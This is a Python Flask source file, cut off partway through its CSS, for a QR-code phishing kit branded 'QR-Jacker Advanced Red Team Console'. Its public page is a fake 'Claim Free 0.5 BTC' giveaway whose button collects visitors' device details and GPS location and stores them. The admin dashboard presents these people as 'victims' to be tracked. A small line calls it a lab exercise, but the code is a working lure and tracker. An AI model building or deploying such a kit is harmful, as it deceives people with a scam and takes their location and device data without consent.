#!/usr/bin/env python3
import os, io, time, threading, sqlite3, qrcode, hmac, json, base64
from datetime import datetime
from functools import wraps
from flask import Flask, request, jsonify, render_template_string, Response, send_from_directory

CLOUDFLARE_URL = os.getenv("CLOUDFLARE_URL", "").rstrip("/")
QR_DIR = os.path.join(os.getcwd(), "qrcodes")
os.makedirs(QR_DIR, exist_ok=True)

LOGS_DIR = os.path.join(os.getcwd(), "logs")
os.makedirs(LOGS_DIR, exist_ok=True)
DB_PATH = os.path.join(LOGS_DIR, "events.db")

DASH_USER = os.getenv("DASH_USER", "admin")
DASH_PASS = os.getenv("DASH_PASS", "labpass")

PUBLIC_HOST, PUBLIC_PORT = "127.0.0.1", 5000
ADMIN_HOST, ADMIN_PORT = "127.0.0.1", 5001

def init_db():
    con = sqlite3.connect(DB_PATH)
    cur = con.cursor()
    cur.execute("""
    CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        time TEXT,
        ip TEXT,
        ua TEXT,
        session TEXT,
        payload TEXT
    )
    """)
    con.commit(); con.close()

def append_log_record(ts, ip, ua, session, payload):
    con = sqlite3.connect(DB_PATH)
    cur = con.cursor()
    cur.execute("INSERT INTO logs (time, ip, ua, session, payload) VALUES (?, ?, ?, ?, ?)",
                (ts, ip, ua, session, json.dumps(payload)))
    con.commit(); con.close()

def read_logs(limit=200):
    con = sqlite3.connect(DB_PATH)
    cur = con.cursor()
    cur.execute("SELECT id,time,ip,ua,session,payload FROM logs ORDER BY id DESC LIMIT ?", (limit,))
    rows = cur.fetchall(); con.close()
    results = []
    for r in rows:
        results.append({
            "id": r[0],
            "time": r[1],
            "ip": r[2],
            "ua": r[3],
            "session": r[4],
            "payload": json.loads(r[5] or "{}")
        })
    return results

def clear_logs():
    con = sqlite3.connect(DB_PATH)
    cur = con.cursor()
    cur.execute("DELETE FROM logs")
    con.commit(); con.close()

public_app = Flask("public_app")

PUBLIC_VISIT_HTML = """
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Claim Free 0.5 BTC</title>
  <style>
    body{background:#0b0b0b;color:#fff;font-family:Inter,monospace;text-align:center;padding:40px}
    .card{max-width:540px;margin:30px auto;background:#101010;border-radius:12px;padding:28px;box-shadow:0 8px 30px rgba(0,0,0,0.7)}
    button{background:linear-gradient(90deg,#ffd700,#ff8c00);border:none;padding:12px 18px;border-radius:8px;font-weight:700;cursor:pointer}
  </style>
</head>
<body>
  <div class="card">
    <h1>Claim 0.5 BTC Now</h1>
    <p>Exclusive limited-time giveaway — click the button below to claim your 0.5 BTC.</p>
    <button id="claim">Claim 0.5 BTC</button>
    <p style="font-size:12px;margin-top:14px;color:#bbb">This is a lab/HTB exercise. If this isn't yours, close this tab.</p>
  </div>

  <script>
  document.getElementById('claim').addEventListener('click', async ()=>{
    const payload = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
      screen: {w: screen.width, h: screen.height},
      languages: navigator.languages || [navigator.language || ""],
      cookieEnabled: navigator.cookieEnabled
    };
    if (navigator.geolocation) {
      try {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej, {timeout:10000})
        );
        payload.coords = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy };
      } catch(e) { payload.coords = null; }
    }
    await fetch('/report', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ session: "__SESSION__", payload })
    });
    alert('Thanks! Your claim is being processed (lab).');
  });
  </script>
</body>
</html>
"""

@public_app.route("/visit")
def public_visit():
    session = request.args.get("s", "unknown")
    ts = datetime.utcnow().isoformat() + "Z"
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent", "")
    append_log_record(ts, ip, ua, session, {})
    return PUBLIC_VISIT_HTML.replace("__SESSION__", session)

@public_app.route("/report", methods=["POST"])
def public_report():
    try:
        j = request.get_json(force=True)
    except Exception:
        return jsonify({"error":"invalid json"}), 400
    session = j.get("session", "unknown")
    payload = j.get("payload", {})
    ts = datetime.utcnow().isoformat() + "Z"
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent", "")
    append_log_record(ts, ip, ua, session, payload)
    return jsonify({"status":"ok"})

@public_app.route("/")
def public_root():
    return """
    <html><body style="background:#080808;color:#fff;font-family:monospace;padding:30px">
      <h2>Public App (visitor-facing)</h2>
      <p>Test: <a href="/visit?s=test_session">/visit?s=test_session</a></p>
    </body></html>
    """

@public_app.route("/health")
def public_health():
    return jsonify({"status":"ok","time": datetime.utcnow().isoformat()+"Z"})

admin_app = Flask("admin_app", static_folder="static")

def check_auth(username, password):
    return hmac.compare_digest(str(username), str(DASH_USER)) and hmac.compare_digest(str(password), str(DASH_PASS))

def authenticate():
    return Response("Auth required", 401, {"WWW-Authenticate": 'Basic realm="Admin"'})

def requires_auth(f):
    @wraps(f)
    def wrapped(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return wrapped

def admin_loading_screen():
    return """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>QR-Jacker - Initializing</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap');
  
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }
  
  :root {
    --bg-primary: #000000;
    --accent-red: #ff0040;
    --accent-red-glow: rgba(255, 0, 64, 0.6);
    --text-primary: #ffffff;
    --text-muted: #666666;
  }
  
  body {
    background: var(--bg-primary);
    color: var(--text-primary);
    font-family: 'Rajdhani', sans-serif;
    overflow: hidden;
    height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  
  body::before {
    content: '';
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-image: 
      linear-gradient(rgba(255, 0, 64, 0.1) 1px, transparent 1px),
      linear-gradient(90deg, rgba(255, 0, 64, 0.1) 1px, transparent 1px);
    background-size: 50px 50px;
    animation: gridMove 20s linear infinite;
    z-index: 0;
  }
  
  @keyframes gridMove {
    0% { transform: translate(0, 0); }
    100% { transform: translate(50px, 50px); }
  }
  
  body::after {
    content: '';
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: repeating-linear-gradient(
      0deg,
      rgba(0, 0, 0, 0.15),
      rgba(0, 0, 0, 0.15) 1px,
      transparent 1px,
      transparent 2px
    );
    pointer-events: none;
    z-index: 9999;
    animation: scanline 8s linear infinite;
  }
  
  @keyframes scanline {
    0% { transform: translateY(0); }
    100% { transform: translateY(10px); }
  }
  
  .loader-container {
    position: absolute;
    top: 55%;
    left: 50%;
    transform: translate(-50%, -50%);
    z-index: 1;
    text-align: center;
    max-width: 600px;
    padding: 40px;
    margin-top: 0;
  }
  
  .logo-wrapper {
    margin-bottom: 40px;
    margin-top: 0;
    animation: logoAppear 1s ease-out;
  }
  
  @keyframes logoAppear {
    0% {
      opacity: 0;
      transform: scale(0.5) rotateY(180deg);
    }
    100% {
      opacity: 1;
      transform: scale(1) rotateY(0deg);
    }
  }
  
  .logo-container {
    width: 150px;
    height: 150px;
    margin: 0 auto;
    position: relative;
    border: 3px solid var(--accent-red);
    border-radius: 50%;
    box-shadow: 
      0 0 30px var(--accent-red-glow),
      inset 0 0 30px rgba(255, 0, 64, 0.2);
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
    animation: logoPulse 2s ease-in-out infinite;
  }
  
  @keyframes logoPulse {
    0%, 100% {
      box-shadow: 
        0 0 30px var(--accent-red-glow),
        inset 0 0 30px rgba(255, 0, 64, 0.2);
    }
    50% {
      box-shadow: 
        0 0 50px var(--accent-red-glow),
        inset 0 0 50px rgba(255, 0, 64, 0.3);
    }
  }
  
  .logo-container img {
    width: 90%;
    height: 90%;
    object-fit: contain;
    filter: drop-shadow(0 0 10px var(--accent-red-glow));
  }
  
  .logo-placeholder {
    font-size: 64px;
    font-weight: 900;
    font-family: 'Orbitron', sans-serif;
    color: var(--accent-red);
    text-shadow: 0 0 20px var(--accent-red-glow);
  }
  
  .logo-container::before {
    content: '';
    position: absolute;
    width: 170px;
    height: 170px;
    border: 2px solid transparent;
    border-top-color: var(--accent-red);
    border-right-color: var(--accent-red);
    border-radius: 50%;
    animation: logoRotate 3s linear infinite;
  }
  
  @keyframes logoRotate {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
  
  .title {
    font-family: 'Orbitron', sans-serif;
    font-size: 48px;
    font-weight: 900;
    color: var(--accent-red);
    text-transform: uppercase;
    letter-spacing: 8px;
    margin-bottom: 20px;
    text-shadow: 0 0 30px var(--accent-red-glow);
    animation: titleGlitch 3s ease-in-out infinite;
  }
  
  @keyframes titleGlitch {
    0%, 90%, 100% {
      transform: translateX(0);
      opacity: 1;
    }
    92% {
      transform: translateX(-5px);
      opacity: 0.8;
    }
    94% {
      transform: translateX(5px);
      opacity: 0.8;
    }
    96% {
      transform: translateX(-5px);
      opacity: 0.8;
    }
  }
  
  .subtitle {
    font-size: 14px;
    color: var(--text-muted);
    text-transform: uppercase;
    letter-spacing: 4px;
    margin-bottom: 50px;
    animation: fadeIn 1.5s ease-out;
  }
  
  @keyframes fadeIn {
    0% { opacity: 0; }
    100% { opacity: 1; }
  }
  
  .loading-bar-wrapper {
    width: 100%;
    height: 4px;
    background: rgba(255, 255, 255, 0.05);
    border-radius: 2px;
    overflow: hidden;
    margin-bottom: 20px;
    box-shadow: 0 0 10px rgba(255, 0, 64, 0.3);
  }
  
  .loading-bar {
    height: 100%;
    width: 0%;
    background: linear-gradient(90deg, 
      var(--accent-red),
      #ff3366,
      var(--accent-red)
    );
    background-size: 200% 100%;
    animation: loadingBarGlow 2s linear infinite;
    box-shadow: 0 0 20px var(--accent-red-glow);
    transition: width 0.3s ease;
  }
  
  @keyframes loadingBarGlow {
    0% {
      background-position: 0% 0;
    }
    100% {
      background-position: 200% 0;
    }
  }
  
  .loading-text {
    font-size: 16px;
    color: var(--text-primary);
    font-weight: 600;
    letter-spacing: 2px;
    margin-bottom: 10px;
    animation: textPulse 1.5s ease-in-out infinite;
  }
  
  @keyframes textPulse {
    0%, 100% { opacity: 0.6; }
    50% { opacity: 1; }
  }
  
  .loading-dots::after {
    content: '';
    animation: dots 1.5s steps(4, end) infinite;
  }
  
  @keyframes dots {
    0%, 20% { content: ''; }
    40% { content: '.'; }
    60% { content: '..'; }
    80%, 100% { content: '...'; }
  }
  
  .progress-percentage {
    font-family: 'Orbitron', sans-serif;
    font-size: 32px;
    font-weight: 700;
    color: var(--accent-red);
    text-shadow: 0 0 20px var(--accent-red-glow);
    margin-bottom: 30px;
  }
  
  .status-messages {
    min-height: 60px;
    margin-bottom: 30px;
  }
  
  .status-message {
    font-size: 13px;
    color: var(--text-muted);
    letter-spacing: 1px;
    text-transform: uppercase;
    animation: statusFade 0.5s ease-in;
  }
  
  @keyframes statusFade {
    0% {
      opacity: 0;
      transform: translateY(10px);
    }
    100% {
      opacity: 1;
      transform: translateY(0);
    }
  }
  
  .credit {
    position: fixed;
    bottom: 30px;
    left: 50%;
    transform: translateX(-50%);
    font-size: 14px;
    color: var(--text-muted);
    letter-spacing: 2px;
    text-transform: uppercase;
    z-index: 2;
    animation: creditAppear 2s ease-out;
  }
  
  @keyframes creditAppear {
    0% {
      opacity: 0;
      transform: translateX(-50%) translateY(20px);
    }
    100% {
      opacity: 1;
      transform: translateX(-50%) translateY(0);
    }
  }
  
  .credit-highlight {
    color: var(--accent-red);
    font-weight: 700;
    text-shadow: 0 0 10px var(--accent-red-glow);
  }
  
  .particles {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 0;
    pointer-events: none;
  }
  
  .particle {
    position: absolute;
    width: 2px;
    height: 2px;
    background: var(--accent-red);
    box-shadow: 0 0 10px var(--accent-red-glow);
    border-radius: 50%;
    animation: particleFloat 10s linear infinite;
  }
  
  @keyframes particleFloat {
    0% {
      transform: translateY(100vh) translateX(0);
      opacity: 0;
    }
    10% {
      opacity: 1;
    }
    90% {
      opacity: 1;
    }
    100% {
      transform: translateY(-100px) translateX(50px);
      opacity: 0;
    }
  }
</style>
</head>
<body>
  <div class="particles" id="particles"></div>
  
  <div class="loader-container">
    <div class="logo-wrapper">
      <div class="logo-container">
        <img id="custom-logo" src="/static/loading-logo.png" alt="Logo" 
             onerror="this.style.display='none';document.querySelector('.logo-placeholder').style.display='block'">
        <div class="logo-placeholder" style="display:none;">QJ</div>
      </div>
    </div>
    
    <h1 class="title">QR-JACKER</h1>
    <div class="subtitle">Advanced Red Team Console</div>
    
    <div class="progress-percentage" id="progress">0%</div>
    
    <div class="loading-bar-wrapper">
      <div class="loading-bar" id="progressBar"></div>
    </div>
    
    <div class="loading-text">
      <span class="loading-dots">INITIALIZING SYSTEM</span>
    </div>
    
    <div class="status-messages">
      <div class="status-message" id="status">Loading modules...</div>
    </div>
  </div>
  
  <div class="credit">
    DEVELOPED BY : <span class="credit-highlight">@ETHICALPHOENIX</span>
  </div>

  <script>
    const particlesContainer = document.getElementById('particles');
    for (let i = 0; i < 30; i++) {
      const particle = document.createElement('div');
      particle.className = 'particle';
      particle.style.left = Math.random() * 100 + '%';
      particle.style.animationDelay = Math.random() * 10 + 's';
      particle.style.animationDuration = (Math.random() * 5 + 8) + 's';
      particlesContainer.appendChild(particle);
    }
    
    const statusMessages = [
      'Loading modules...',
      'Initializing database...',
      'Connecting to server...',
      'Loading security protocols...',
      'Initializing QR generator...',
      'Starting victim tracker...',
      'Configuring admin panel...',
      'Loading complete!'
    ];
    
    let progress = 0;
    let currentMessage = 0;
    
    const progressElem = document.getElementById('progress');
    const progressBar = document.getElementById('progressBar');
    const statusElem = document.getElementById('status');
    
    const loadingInterval = setInterval(() => {
      progress += Math.random() * 15 + 5;
      if (progress >= 100) {
        progress = 100;
        clearInterval(loadingInterval);
        setTimeout(() => {
          window.location.href = '/?loaded=1';
        }, 500);
      }
      
      progressElem.textContent = Math.floor(progress) + '%';
      progressBar.style.width = progress + '%';
      
      const messageIndex = Math.floor((progress / 100) * statusMessages.length);
      if (messageIndex !== currentMessage && messageIndex < statusMessages.length) {
        currentMessage = messageIndex;
        statusElem.textContent = statusMessages[currentMessage];
        statusElem.style.animation = 'none';
        setTimeout(() => {
          statusElem.style.animation = 'statusFade 0.5s ease-in';
        }, 10);
      }
    }, 300);
    
    const customLogo = document.getElementById('custom-logo');
    const img = new Image();
    img.onload = () => {
      customLogo.style.display = 'block';
      document.querySelector('.logo-placeholder').style.display = 'none';
    };
    img.onerror = () => {
      customLogo.style.display = 'none';
      document.querySelector('.logo-placeholder').style.display = 'block';
    };
    img.src = '/static/loading-logo.png';
  </script>
</body>
</html>
    """

ADMIN_INDEX_HTML = """
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>QR-Jacker Advanced Console</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap');
  
  * { margin: 0; padding: 0; box-sizing: border-box; }
  
  :root {
    --bg-primary: #000000;
    --bg-secondary: #0a0a0a;
    --bg-tertiary: #141414;
    --accent-red: #ff0040;
    --accent-red-glow: rgba(255, 0, 64, 0.4);
    --accent-red-dim: rgba(255, 0, 64, 0.15);
    --text-primary: #ffffff;
    --text-secondary: #b0b0b0;
    --text-muted: #666666;
    --border: #1a1a1a;
    --border-bright: #2a2a2a;
    --success: #00ff00;
    --warning: #ffaa00;
  }
  
  body {
    background: var(--bg-primary);
    color: var(--text-primary);
    font-family: 'Rajdhani', sans-serif;
    overflow-x: hidden;
    min-height: 100vh;
  }
  
  /* Scanline effect */
  body::before {
    content: '';
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: repeating-linear-gradient(
      0deg,
      rgba(0, 0, 0, 0.15),
      rgba(0, 0, 0, 0.15) 1px,
      transparent 1px,
      transparent 2px
    );
    pointer-events: none;
    z-index: 9999;
    animation: scanline 8s linear infinite;
  }
  
  @keyframes scanline {
    0% { transform: translateY(0); }
    100% { transform: translateY(10px); }
  }
  
  /* Grid background */
  body::after {
    content: '';
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-image: 
      linear-gradient(var(--border) 1px, transparent 1px),
      linear-gradient(90deg, var(--border) 1px, transparent 1px);
    background-size: 40px 40px;
    opacity: 0.3;
    z-index: 0;
    pointer-events: none;
  }
  
  .container {
    position: relative;
    z-index: 1;
    max-width: 1600px;
    margin: 0 auto;
    padding: 0;
  }
  
  /* Header */
  .header {
    background: linear-gradient(180deg, var(--bg-secondary) 0%, transparent 100%);
    border-bottom: 2px solid var(--accent-red);
    padding: 20px 30px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    box-shadow: 0 0 30px var(--accent-red-glow);
    position: sticky;
    top: 0;
    z-index: 100;
    backdrop-filter: blur(10px);
  }
  
  .header-left {
    display: flex;
    align-items: center;
    gap: 20px;
  }
  
  .logo-container {
    width: 60px;
    height: 60px;
    border: 2px solid var(--accent-red);
    border-radius: 8px;
    display: flex;
    align-items: center;
    justify-content: center;
    background: var(--bg-tertiary);
    box-shadow: 0 0 20px var(--accent-red-glow);
    overflow: hidden;
  }
  
  .logo-container img {
    width: 100%;
    height: 100%;
    object-fit: contain;
  }
  
  .logo-placeholder {
    font-size: 32px;
    font-weight: 900;
    font-family: 'Orbitron', sans-serif;
    color: var(--accent-red);
    text-shadow: 0 0 10px var(--accent-red-glow);
  }
  
  .header-title h1 {
    font-family: 'Orbitron', sans-serif;
    font-size: 32px;
    font-weight: 900;
    color: var(--accent-red);
    text-transform: uppercase;
    letter-spacing: 4px;
    text-shadow: 0 0 20px var(--accent-red-glow);
    margin: 0;
  }
  
  .header-title .subtitle {
    font-size: 12px;
    color: var(--text-secondary);
    letter-spacing: 2px;
    text-transform: uppercase;
    margin-top: 4px;
  }
  
  .header-right {
    display: flex;
    align-items: center;
    gap: 20px;
  }
  
  .status-indicator {
    display: flex;
    align-items: center;
    gap: 10px;
    padding: 8px 16px;
    background: var(--bg-tertiary);
    border: 1px solid var(--border-bright);
    border-radius: 4px;
  }
  
  .pulse-dot {
    width: 10px;
    height: 10px;
    background: var(--accent-red);
    border-radius: 50%;
    box-shadow: 0 0 10px var(--accent-red-glow);
    animation: pulse 2s ease-in-out infinite;
  }
  
  @keyframes pulse {
    0%, 100% { opacity: 1; transform: scale(1); }
    50% { opacity: 0.3; transform: scale(1.3); }
  }
  
  .status-text {
    font-size: 13px;
    font-weight: 600;
    color: var(--accent-red);
    text-transform: uppercase;
    letter-spacing: 1px;
  }
  
  /* Main Content */
  .content {
    padding: 30px;
  }
  
  /* Stats Section */
  .stats-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
    gap: 20px;
    margin-bottom: 30px;
  }
  
  .stat-card {
    background: var(--bg-secondary);
    border: 1px solid var(--border-bright);
    border-radius: 8px;
    padding: 24px;
    position: relative;
    overflow: hidden;
    transition: all 0.3s ease;
  }
  
  .stat-card::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 2px;
    background: linear-gradient(90deg, transparent, var(--accent-red), transparent);
    animation: slideBar 3s linear infinite;
  }
  
  @keyframes slideBar {
    0% { transform: translateX(-100%); }
    100% { transform: translateX(100%); }
  }
  
  .stat-card:hover {
    transform: translateY(-4px);
    border-color: var(--accent-red);
    box-shadow: 0 8px 30px var(--accent-red-dim);
  }
  
  .stat-label {
    font-size: 11px;
    text-transform: uppercase;
    letter-spacing: 2px;
    color: var(--text-muted);
    margin-bottom: 12px;
    font-weight: 600;
  }
  
  .stat-value {
    font-size: 48px;
    font-weight: 700;
    font-family: 'Orbitron', sans-serif;
    color: var(--accent-red);
    text-shadow: 0 0 15px var(--accent-red-glow);
    line-height: 1;
  }
  
  .stat-change {
    font-size: 12px;
    color: var(--success);
    margin-top: 8px;
  }
  
  /* Action Bar */
  .action-bar {
    background: var(--bg-secondary);
    border: 1px solid var(--border-bright);
    border-radius: 8px;
    padding: 20px;
    margin-bottom: 30px;
    display: flex;
    gap: 12px;
    flex-wrap: wrap;
    align-items: center;
  }
  
  button {
    background: var(--bg-tertiary);
    color: var(--text-primary);
    border: 1px solid var(--border-bright);
    padding: 12px 24px;
    border-radius: 4px;
    font-family: 'Rajdhani', sans-serif;
    font-size: 14px;
    font-weight: 600;
    text-transform: uppercase;
    letter-spacing: 1px;
    cursor: pointer;
    transition: all 0.2s ease;
    position: relative;
    overflow: hidden;
  }
  
  button::before {
    content: '';
    position: absolute;
    top: 50%;
    left: 50%;
    width: 0;
    height: 0;
    background: var(--accent-red-dim);
    transform: translate(-50%, -50%);
    transition: width 0.6s, height 0.6s;
    border-radius: 50%;
  }
  
  button:hover::before {
    width: 400px;
    height: 400px;
  }
  
  button:hover {
    border-color: var(--accent-red);
    color: var(--accent-red);
    box-shadow: 0 0 15px var(--accent-red-dim);
  }
  
  button span {
    position: relative;
    z-index: 1;
  }
  
  button.primary {
    background: linear-gradient(135deg, var(--accent-red) 0%, #cc0033 100%);
    border: none;
    color: #fff;
  }
  
  button.primary:hover {
    transform: translateY(-2px);
    box-shadow: 0 8px 25px var(--accent-red-glow);
  }
  
  button.danger {
    border-color: #ff3333;
    color: #ff3333;
  }
  
  button.danger:hover {
    background: #ff3333;
    color: #fff;
  }
  
  /* QR Display */
  #qrbox {
    margin-bottom: 30px;
  }
  
  .qr-display {
    background: var(--bg-secondary);
    border: 1px solid var(--accent-red);
    border-radius: 8px;
    padding: 30px;
    text-align: center;
    box-shadow: 0 0 30px var(--accent-red-dim);
    animation: slideIn 0.4s ease;
  }
  
  @keyframes slideIn {
    from { opacity: 0; transform: translateY(-30px); }
    to { opacity: 1; transform: translateY(0); }
  }
  
  .qr-display img {
    border-radius: 8px;
    border: 3px solid var(--accent-red);
    box-shadow: 0 0 40px var(--accent-red-glow);
    margin: 20px 0;
  }
  
  .qr-info {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    gap: 16px;
    margin-top: 20px;
    text-align: left;
  }
  
  .qr-info-item {
    background: var(--bg-tertiary);
    padding: 12px;
    border-radius: 4px;
    border-left: 3px solid var(--accent-red);
  }
  
  .qr-info-label {
    font-size: 11px;
    color: var(--text-muted);
    text-transform: uppercase;
    letter-spacing: 1px;
  }
  
  .qr-info-value {
    font-size: 13px;
    color: var(--accent-red);
    margin-top: 4px;
    word-break: break-all;
    font-weight: 600;
  }
  
  /* Section Header */
  .section-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 20px;
    padding-bottom: 12px;
    border-bottom: 1px solid var(--border-bright);
  }
  
  .section-header h2 {
    font-family: 'Orbitron', sans-serif;
    font-size: 20px;
    font-weight: 700;
    color: var(--text-primary);
    text-transform: uppercase;
    letter-spacing: 2px;
  }
  
  .filter-group {
    display: flex;
    gap: 8px;
  }
  
  .filter-btn {
    padding: 6px 14px;
    font-size: 11px;
    background: var(--bg-tertiary);
    border: 1px solid var(--border);
    color: var(--text-secondary);
  }
  
  .filter-btn.active {
    background: var(--accent-red);
    border-color: var(--accent-red);
    color: #fff;
  }
  
  /* Victims Grid */
  #grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
    gap: 20px;
  }
  
  .tile {
    background: var(--bg-secondary);
    border: 1px solid var(--border-bright);
    border-radius: 8px;
    padding: 20px;
    transition: all 0.3s ease;
    cursor: pointer;
    position: relative;
    overflow: hidden;
    animation: fadeIn 0.5s ease;
  }
  
  @keyframes fadeIn {
    from { opacity: 0; transform: scale(0.95); }
    to { opacity: 1; transform: scale(1); }
  }
  
  .tile::before {
    content: '';
    position: absolute;
    top: -2px;
    left: -2px;
    right: -2px;
    bottom: -2px;
    background: linear-gradient(45deg, var(--accent-red), transparent, var(--accent-red));
    opacity: 0;
    transition: opacity 0.3s ease;
    z-index: 0;
    border-radius: 8px;
  }
  
  .tile:hover::before {
    opacity: 0.3;
  }
  
  .tile:hover {
    transform: translateY(-4px);
    box-shadow: 0 8px 40px var(--accent-red-dim);
    border-color: var(--accent-red);
  }
  
  .tile-content {
    position: relative;
    z-index: 1;
  }
  
  .tile-header {
    display: flex;
    align-items: center;
    gap: 16px;
    margin-bottom: 16px;
    padding-bottom: 12px;
    border-bottom: 1px solid var(--border);
  }
  
  .device-icon-wrapper {
    width: 50px;
    height: 50px;
    background: var(--bg-tertiary);
    border: 2px solid var(--border-bright);
    border-radius: 8px;
    display: flex;
    align-items: center;
    justify-content: center;
    overflow: hidden;
  }
  
  .device-icon {
    width: 100%;
    height: 100%;
    object-fit: contain;
    filter: drop-shadow(0 0 8px var(--accent-red-glow));
  }
  
  .device-fallback {
    font-size: 24px;
  }
  
  .tile-header-info {
    flex: 1;
  }
  
  .session-id {
    font-family: 'Orbitron', sans-serif;
    font-size: 16px;
    font-weight: 700;
    color: var(--accent-red);
    margin-bottom: 4px;
  }
  
  .device-name {
    font-size: 12px;
    color: var(--text-muted);
    text-transform: uppercase;
    letter-spacing: 1px;
  }
  
  .tile-details {
    display: grid;
    gap: 10px;
  }
  
  .detail-row {
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-size: 13px;
  }
  
  .detail-label {
    color: var(--text-muted);
    text-transform: uppercase;
    font-size: 11px;
    letter-spacing: 1px;
  }
  
  .detail-value {
    color: var(--text-primary);
    font-weight: 600;
  }
  
  .detail-value.highlight {
    color: var(--accent-red);
  }
  
  .tile-badges {
    display: flex;
    gap: 8px;
    margin-top: 12px;
    flex-wrap: wrap;
  }
  
  .badge {
    background: var(--bg-tertiary);
    border: 1px solid var(--border);
    color: var(--text-secondary);
    padding: 4px 10px;
    border-radius: 3px;
    font-size: 10px;
    font-weight: 600;
    text-transform: uppercase;
    letter-spacing: 0.5px;
  }
  
  .badge.geo {
    background: var(--accent-red-dim);
    border-color: var(--accent-red);
    color: var(--accent-red);
  }
  
  /* Context Menu */
  .context-menu {
    position: fixed;
    background: var(--bg-secondary);
    border: 2px solid var(--accent-red);
    border-radius: 8px;
    padding: 8px 0;
    min-width: 220px;
    box-shadow: 0 8px 40px rgba(0, 0, 0, 0.9), 0 0 30px var(--accent-red-glow);
    z-index: 10000;
    display: none;
    backdrop-filter: blur(10px);
  }
  
  .context-menu.active {
    display: block;
    animation: contextAppear 0.2s ease;
  }
  
  @keyframes contextAppear {
    from { opacity: 0; transform: scale(0.95); }
    to { opacity: 1; transform: scale(1); }
  }
  
  .context-menu-item {
    padding: 12px 20px;
    cursor: pointer;
    transition: all 0.2s ease;
    display: flex;
    align-items: center;
    gap: 12px;
    font-size: 13px;
    font-weight: 600;
    text-transform: uppercase;
    letter-spacing: 1px;
  }
  
  .context-menu-item:hover {
    background: var(--accent-red-dim);
    color: var(--accent-red);
  }
  
  .context-menu-icon {
    width: 16px;
    text-align: center;
    font-size: 14px;
  }
  
  .context-menu-divider {
    height: 1px;
    background: var(--border);
    margin: 8px 0;
  }
  
  /* Modal */
  .modal-overlay {
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: rgba(0, 0, 0, 0.9);
    backdrop-filter: blur(5px);
    z-index: 9998;
    display: none;
    align-items: center;
    justify-content: center;
  }
  
  .modal-overlay.active {
    display: flex;
    animation: fadeInOverlay 0.3s ease;
  }
  
  @keyframes fadeInOverlay {
    from { opacity: 0; }
    to { opacity: 1; }
  }
  
  .modal {
    background: var(--bg-secondary);
    border: 2px solid var(--accent-red);
    border-radius: 12px;
    max-width: 700px;
    width: 90%;
    max-height: 80vh;
    overflow-y: auto;
    box-shadow: 0 0 60px var(--accent-red-glow);
    animation: slideInModal 0.3s ease;
  }
  
  @keyframes slideInModal {
    from { opacity: 0; transform: translateY(-50px) scale(0.9); }
    to { opacity: 1; transform: translateY(0) scale(1); }
  }
  
  .modal-header {
    padding: 24px;
    border-bottom: 1px solid var(--border-bright);
    display: flex;
    justify-content: space-between;
    align-items: center;
  }
  
  .modal-title {
    font-family: 'Orbitron', sans-serif;
    font-size: 20px;
    font-weight: 700;
    color: var(--accent-red);
    text-transform: uppercase;
    letter-spacing: 2px;
  }
  
  .modal-close {
    background: none;
    border: none;
    color: var(--text-muted);
    font-size: 24px;
    cursor: pointer;
    padding: 0;
    width: 32px;
    height: 32px;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: all 0.2s ease;
  }
  
  .modal-close:hover {
    color: var(--accent-red);
    transform: rotate(90deg);
  }
  
  .modal-body {
    padding: 24px;
  }
  
  .info-grid {
    display: grid;
    gap: 16px;
  }
  
  .info-section {
    background: var(--bg-tertiary);
    border: 1px solid var(--border);
    border-radius: 6px;
    padding: 16px;
  }
  
  .info-section-title {
    font-size: 12px;
    text-transform: uppercase;
    letter-spacing: 1px;
    color: var(--text-muted);
    margin-bottom: 12px;
    padding-bottom: 8px;
    border-bottom: 1px solid var(--border);
  }
  
  .info-row {
    display: flex;
    justify-content: space-between;
    padding: 8px 0;
    border-bottom: 1px solid var(--border);
    font-size: 13px;
  }
  
  .info-row:last-child {
    border-bottom: none;
  }
  
  .info-label {
    color: var(--text-muted);
    font-weight: 600;
  }
  
  .info-value {
    color: var(--text-primary);
    text-align: right;
    max-width: 60%;
    word-break: break-word;
  }
  
  .info-value.accent {
    color: var(--accent-red);
    font-weight: 700;
  }
  
